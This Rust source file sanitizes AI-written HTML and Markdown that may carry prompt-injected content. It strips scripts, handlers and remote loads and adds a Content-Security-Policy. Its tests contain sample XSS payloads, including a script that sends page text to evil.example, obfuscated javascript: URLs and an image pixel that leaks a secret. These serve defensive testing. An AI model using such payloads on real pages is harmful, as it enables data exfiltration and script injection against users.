//! Makes model-written files safe to open. The screen replica is HTML that
//! Gemini wrote from a screenshot; the research brief is Markdown. Either
//! could carry instructions injected by content on screen or on the web, so
//! scripts, event handlers, remote loads and forms are removed, and the HTML
//! gets a Content-Security-Policy that blocks anything that slipped through.

/// Policy placed first in every saved replica: no scripts, no network, no forms.
pub const REPLICA_CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; \
font-src data:; form-action 'none'; base-uri 'none'; frame-src 'none'";

/// Elements removed together with everything inside them.
const DROP_WITH_CONTENT: &[&str] = &[
    "script", "iframe", "object", "embed", "frame", "frameset", "applet", "portal",
];
/// Elements whose tags are removed (their text content stays).
const DROP_TAG: &[&str] = &["base", "link", "meta", "form"];
/// Attributes that can navigate, load or run something on their own.
const DROP_ATTRS: &[&str] = &["srcdoc", "formaction", "action", "ping", "http-equiv"];

fn lower(s: &str) -> String {
    s.to_ascii_lowercase()
}

/// Decode the character references a browser decodes in attribute values
/// (`&#106;`, `&#x6A;`, `&colon;`, `&Tab;`, ...), enough to see through
/// obfuscated `javascript:` URLs.
fn decode_entities(v: &str) -> String {
    let mut out = String::with_capacity(v.len());
    let mut rest = v;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        let after = &rest[amp + 1..];
        let end = after
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '#'))
            .unwrap_or(after.len());
        let entity = &after[..end];
        let decoded = if let Some(num) = entity.strip_prefix('#') {
            let n = match num.strip_prefix(['x', 'X']) {
                Some(hex) => u32::from_str_radix(hex, 16).ok(),
                None => num.parse::<u32>().ok(),
            };
            n.and_then(char::from_u32)
        } else {
            match entity.to_ascii_lowercase().as_str() {
                "colon" => Some(':'),
                "tab" => Some('\t'),
                "newline" => Some('\n'),
                "sol" => Some('/'),
                "lpar" => Some('('),
                "rpar" => Some(')'),
                _ => None,
            }
        };
        match decoded {
            Some(c) => {
                out.push(c);
                let skip = end + usize::from(after[end..].starts_with(';'));
                rest = &after[skip..];
            }
            None => {
                out.push('&');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Value as a browser would read a URL: entities decoded, no whitespace or
/// control characters.
fn compact(v: &str) -> String {
    decode_entities(v)
        .chars()
        .filter(|c| !c.is_whitespace() && !c.is_control())
        .collect::<String>()
        .to_ascii_lowercase()
}

/// Attributes that load a resource as soon as the page opens.
const LOAD_ATTRS: &[&str] = &[
    "src",
    "srcset",
    "poster",
    "background",
    "data",
    "lowsrc",
    "dynsrc",
];

fn dangerous_value(v: &str) -> bool {
    let c = compact(v);
    c.starts_with("javascript:")
        || c.starts_with("vbscript:")
        || c.contains("javascript:")
        || (c.starts_with("data:") && !c.starts_with("data:image/")
            || c.starts_with("data:image/svg"))
}

struct Attr {
    name: String,
    value: Option<String>,
}

/// Parse `name="v" name2 name3=v3` (the inside of a tag after its name).
fn parse_attrs(s: &str) -> Vec<Attr> {
    let b: Vec<char> = s.chars().collect();
    let mut i = 0;
    let mut out = Vec::new();
    while i < b.len() {
        while i < b.len() && (b[i].is_whitespace() || b[i] == '/') {
            i += 1;
        }
        let start = i;
        while i < b.len() && !b[i].is_whitespace() && b[i] != '=' && b[i] != '/' {
            i += 1;
        }
        if start == i {
            i += 1;
            continue;
        }
        let name: String = b[start..i].iter().collect();
        while i < b.len() && b[i].is_whitespace() {
            i += 1;
        }
        let mut value = None;
        if i < b.len() && b[i] == '=' {
            i += 1;
            while i < b.len() && b[i].is_whitespace() {
                i += 1;
            }
            if i < b.len() && (b[i] == '"' || b[i] == '\'') {
                let q = b[i];
                i += 1;
                let vs = i;
                while i < b.len() && b[i] != q {
                    i += 1;
                }
                value = Some(b[vs..i.min(b.len())].iter().collect());
                i += 1;
            } else {
                let vs = i;
                while i < b.len() && !b[i].is_whitespace() {
                    i += 1;
                }
                value = Some(b[vs..i].iter().collect());
            }
        }
        out.push(Attr { name, value });
    }
    out
}

/// Find the end of a tag starting at `from` (the index just after `<`),
/// honouring quoted attribute values. Returns the index of `>`.
fn tag_end(s: &str, from: usize) -> Option<usize> {
    let mut quote: Option<char> = None;
    for (i, c) in s[from..].char_indices() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, '"' | '\'') => quote = Some(c),
            (None, '>') => return Some(from + i),
            _ => {}
        }
    }
    None
}

/// Position just after the closing `</name ...>` (case-insensitive), or the end.
fn skip_element(s: &str, from: usize, name: &str) -> usize {
    let hay = lower(&s[from..]);
    let needle = format!("</{name}");
    match hay.find(&needle) {
        Some(i) => {
            let at = from + i + needle.len();
            tag_end(s, at).map(|e| e + 1).unwrap_or(s.len())
        }
        None => s.len(),
    }
}

fn clean_tag(name: &str, attrs: &str, self_closing: bool) -> String {
    let mut out = format!("<{name}");
    for a in parse_attrs(attrs) {
        let n = lower(&a.name);
        if n.starts_with("on") || DROP_ATTRS.contains(&n.as_str()) {
            continue;
        }
        match a.value {
            Some(v) => {
                if dangerous_value(&v) {
                    continue;
                }
                // Only inline images may load; nothing from the network.
                if LOAD_ATTRS.contains(&n.as_str()) && !compact(&v).starts_with("data:image/") {
                    continue;
                }
                if n == "style"
                    && lower(&v).contains("url(")
                    && !lower(&v).contains("url(data:image/")
                {
                    continue;
                }
                out.push_str(&format!(" {}=\"{}\"", a.name, v.replace('"', "&quot;")));
            }
            None => out.push_str(&format!(" {}", a.name)),
        }
    }
    if self_closing {
        out.push_str(" /");
    }
    out.push('>');
    out
}

/// Remove scripts, event handlers, remote loads and forms from model-written
/// HTML, and put a strict Content-Security-Policy first in the document.
pub fn sanitize_html(input: &str) -> String {
    let s = input;
    let mut out = String::with_capacity(s.len() + 200);
    let mut i = 0;
    while i < s.len() {
        let Some(rel) = s[i..].find('<') else {
            out.push_str(&s[i..]);
            break;
        };
        out.push_str(&s[i..i + rel]);
        let lt = i + rel;
        let rest = &s[lt + 1..];
        // Comments and doctype pass through untouched.
        if rest.starts_with("!--") {
            let end = s[lt..].find("-->").map(|e| lt + e + 3).unwrap_or(s.len());
            out.push_str(&s[lt..end]);
            i = end;
            continue;
        }
        let Some(end) = tag_end(s, lt + 1) else {
            out.push_str("&lt;");
            i = lt + 1;
            continue;
        };
        let inner = &s[lt + 1..end];
        if inner.starts_with('!') || inner.starts_with('?') {
            if lower(inner).starts_with("!doctype") {
                out.push_str(&s[lt..=end]);
            }
            i = end + 1;
            continue;
        }
        let closing = inner.starts_with('/');
        let body = inner.trim_start_matches('/');
        let name_len = body
            .find(|c: char| c.is_whitespace() || c == '/' || c == '>')
            .unwrap_or(body.len());
        let name = lower(&body[..name_len]);
        if name.is_empty()
            || !name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == ':')
        {
            out.push_str("&lt;");
            i = lt + 1;
            continue;
        }
        let local = name.rsplit(':').next().unwrap_or(&name).to_string();
        if DROP_WITH_CONTENT.contains(&local.as_str()) {
            i = if closing {
                end + 1
            } else {
                skip_element(s, end + 1, &name)
            };
            continue;
        }
        if DROP_TAG.contains(&local.as_str()) {
            i = end + 1;
            continue;
        }
        if closing {
            out.push_str(&format!("</{name}>"));
        } else {
            let attrs = &body[name_len..];
            let self_closing = attrs.trim_end().ends_with('/');
            out.push_str(&clean_tag(
                &name,
                attrs.trim_end().trim_end_matches('/'),
                self_closing,
            ));
            // Raw text: keep a style sheet verbatim up to its closing tag.
            if local == "style" {
                let close = lower(&s[end + 1..])
                    .find("</style")
                    .map(|p| end + 1 + p)
                    .unwrap_or(s.len());
                out.push_str(&s[end + 1..close]);
                i = close;
                continue;
            }
        }
        i = end + 1;
    }
    insert_csp(&out)
}

fn insert_csp(html: &str) -> String {
    let meta = format!("<meta http-equiv=\"Content-Security-Policy\" content=\"{REPLICA_CSP}\">");
    let l = lower(html);
    let at = if let Some(h) = l.find("<head") {
        tag_end(html, h + 1).map(|e| e + 1)
    } else if let Some(h) = l.find("<html") {
        tag_end(html, h + 1).map(|e| e + 1)
    } else if l.trim_start().starts_with("<!doctype") {
        l.find('>').map(|e| e + 1)
    } else {
        Some(0)
    };
    let at = at.unwrap_or(0);
    format!("{}{meta}{}", &html[..at], &html[at..])
}

/// Model-written Markdown without images (remote loads) or raw HTML, outside
/// code. Images become their alt text.
pub fn sanitize_markdown(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut in_fence = false;
    for line in input.split_inclusive('\n') {
        if line.trim_start().starts_with("```") || line.trim_start().starts_with("~~~") {
            in_fence = !in_fence;
            out.push_str(line);
            continue;
        }
        if in_fence {
            out.push_str(line);
            continue;
        }
        let chars: Vec<char> = line.chars().collect();
        let mut in_code = false;
        let mut i = 0;
        while i < chars.len() {
            let c = chars[i];
            if c == '`' {
                in_code = !in_code;
                out.push(c);
                i += 1;
                continue;
            }
            if !in_code && c == '!' && chars.get(i + 1) == Some(&'[') {
                // ![alt](url) → alt
                if let Some(close) = chars[i + 2..].iter().position(|&x| x == ']') {
                    let alt_end = i + 2 + close;
                    if chars.get(alt_end + 1) == Some(&'(') {
                        if let Some(p) = chars[alt_end + 2..].iter().position(|&x| x == ')') {
                            out.extend(&chars[i + 2..alt_end]);
                            i = alt_end + 2 + p + 1;
                            continue;
                        }
                    }
                }
            }
            if !in_code
                && c == '<'
                && chars
                    .get(i + 1)
                    .is_some_and(|n| n.is_ascii_alphabetic() || matches!(n, '/' | '!' | '?'))
            {
                out.push_str("&lt;");
                i += 1;
                continue;
            }
            out.push(c);
            i += 1;
        }
    }
    out
}

/// A URL safe to put inside Markdown `(...)`.
pub fn markdown_url(url: &str) -> String {
    url.replace('(', "%28")
        .replace(')', "%29")
        .replace(' ', "%20")
        .replace('<', "%3C")
        .replace('>', "%3E")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_scripts_handlers_and_remote_loads() {
        let html = r#"<!DOCTYPE html><html><head><title>Inbox</title>
<meta http-equiv="refresh" content="0;url=https://evil.example">
<link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/">
<script>fetch('https://evil.example/?d='+document.body.innerText)</script>
<style>.a{color:red}</style></head>
<body onload="steal()"><div class="a" OnClick='x()' style="color:blue">Hi</div>
<a href=" JaVa&#10;script:alert(1)">bad</a><a href="javascript:alert(1)">bad2</a>
<a href="https://example.com/">ok</a>
<img src="https://evil.example/p.png?d=1"><img src="data:image/png;base64,AAAA" alt="x">
<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">s</a></svg>
<iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name=p></form>
<SCRIPT src=//evil.example/a.js></SCRIPT><object data="x.swf"></object></body></html>"#;
        let out = sanitize_html(html);
        let l = out.to_lowercase();
        for bad in [
            "<script",
            "onload",
            "onclick",
            "javascript:alert",
            "<iframe",
            "<form",
            "action=",
            "<base",
            "<link",
            "refresh",
            "<object",
            "evil.example/x.css",
            "p.png",
            "x.swf",
        ] {
            assert!(!l.contains(bad), "{bad} survived in {out}");
        }
        assert!(out.contains("<style>.a{color:red}</style>"));
        assert!(out.contains(r#"<a href="https://example.com/">ok</a>"#));
        assert!(out.contains("data:image/png;base64,AAAA"));
        assert!(out.contains("Hi</div>"));
        // The policy is the first thing in <head>.
        let head = l.find("<head>").unwrap();
        assert!(l[head..].starts_with("<head><meta http-equiv=\"content-security-policy\""));
        assert_eq!(l.matches("http-equiv").count(), 1);
    }

    #[test]
    fn csp_is_added_without_a_head() {
        let out = sanitize_html("<p>Hello <b>there</b></p>");
        assert!(out.starts_with("<meta http-equiv=\"Content-Security-Policy\""));
        assert!(out.ends_with("<p>Hello <b>there</b></p>"));
        assert_eq!(
            sanitize_html("a < b"),
            format!("{}a &lt; b", insert_csp(""))
        );
    }

    #[test]
    fn markdown_loses_images_and_html_but_keeps_code() {
        let md = "Hi ![pixel](https://evil.example/p.png?d=secret) there\n\
<img src=x onerror=alert(1)> and `a <b> c`\n```html\n<div>code</div>\n```\nx < y\n";
        let out = sanitize_markdown(md);
        assert!(out.contains("Hi pixel there"));
        assert!(!out.contains("evil.example"));
        assert!(out.contains("&lt;img src=x"));
        assert!(out.contains("`a <b> c`"));
        assert!(out.contains("<div>code</div>"));
        assert!(out.contains("x < y"));
        assert_eq!(
            markdown_url("https://e.com/a_(b) c"),
            "https://e.com/a_%28b%29%20c"
        );
    }
}
